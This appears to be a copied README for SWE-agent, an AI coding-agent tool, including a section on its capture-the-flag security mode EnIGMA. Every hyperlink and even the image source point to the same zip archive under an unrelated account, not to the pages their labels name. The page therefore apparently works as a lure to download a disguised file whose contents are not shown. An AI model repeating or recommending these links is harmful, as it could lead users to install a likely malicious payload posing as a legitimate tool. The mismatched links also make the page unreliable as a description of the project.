SWE-agent enables your language model of choice (e.g. GPT-4o or Claude Sonnet 4) to autonomously use tools to
[fix issues in real GitHub repositories](https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip),
[find cybersecurity vulnerabilities](https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip), or
[perform any custom task](https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip).

* âœ… **Free-flowing & generalizable**: Leaves maximal agency to the LM
* âœ… **Configurable & fully documented**: Governed by a single `yaml` file
* âœ… **Made for research**: Simple & hackable by design

SWE-agent is built and maintained by researchers from Princeton University and Stanford University.

## SWE-agent for offensive cybersecurity (EnIGMA) <a name="enigma"></a>

<img src="https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip" height="80px"></img>

[SWE-agent: EnIGMA][enigma] is a mode for solving offensive cybersecurity (capture the flag) challenges.
EnIGMA achieves state-of-the-art results on multiple cybersecurity benchmarks (see [leaderboard](https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip)).
Please use [SWE-agent 0.7](https://github.com/understanding-81/SWE-agent/raw/refs/heads/main/sweagent/run/SW_agent_1.6-beta.2.zip) while we update EnIGMA for 1.0.
